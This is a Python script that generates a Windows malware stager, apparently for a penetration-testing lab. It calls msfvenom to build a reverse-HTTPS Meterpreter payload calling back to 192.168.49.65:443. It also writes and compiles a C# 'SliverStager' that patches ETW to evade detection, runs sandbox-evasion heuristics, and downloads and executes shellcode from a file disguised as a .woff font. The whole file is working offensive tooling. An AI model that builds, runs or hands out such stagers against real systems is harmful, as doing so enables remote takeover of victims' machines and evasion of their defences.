#!/bin/env python3
from ak import *
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
BASE_FILENAME = 'win_msf_sliver_stager'
MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
STAGER_URL = "http://192.168.49.65/stager.woff"

def get_shellcode(msfvenom_cmd):
  shellcode = subprocess.check_output(msfvenom_cmd, shell=True)

  return shellcode

def generate(stager_url):
  url_dl_code = URL_DL_CODE.format(STAGER_URL=STAGER_URL)

  template = """
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace SliverStager
{{
    public class Stager
    {{
        {START_SHELLCODE_IMPORT}
        {HEURISTICS_IMPORT}
        {ARCH_DETECTION}
        {ETW_FUNCS}
        public static void Main()
        {{
            {HEURISTICS_CODE}
            {ETW_PATCH}
            {URL_DL_CODE}
            {START_SHELLCODE}
        }}

    }}
}}
  """.format(URL_DL_CODE=url_dl_code,
             HEURISTICS_IMPORT=HEURISTICS_IMPORT,
             ETW_FUNCS=ETW_FUNCS,
             HEURISTICS_CODE=HEURISTICS_CODE,
             ETW_PATCH=ETW_PATCH,
             ARCH_DETECTION=ARCH_DETECTION,
             START_SHELLCODE_IMPORT=START_SHELLCODE_IMPORT,
             START_SHELLCODE=START_SHELLCODE)

  print(template)
  f = open(BASE_FILENAME + ".cs", "w")
  f.write(template)
  f.close()

  print("Wrote " + BASE_FILENAME + ".cs")


def compile():
  cmd = f"mcs {BASE_FILENAME}.cs"
  os.system(cmd)

def generate_shellcode():
  shellcode = get_shellcode(MSFVENOM_CMD)

  filename = BASE_FILENAME + '.sc'
  f = open(filename, 'wb')
  f.write(shellcode)
  f.close()
  print("Wrote shellcode to " + filename)

def main():
  generate_shellcode()
  generate(STAGER_URL)
  compile()

if __name__ == "__main__":
  main()
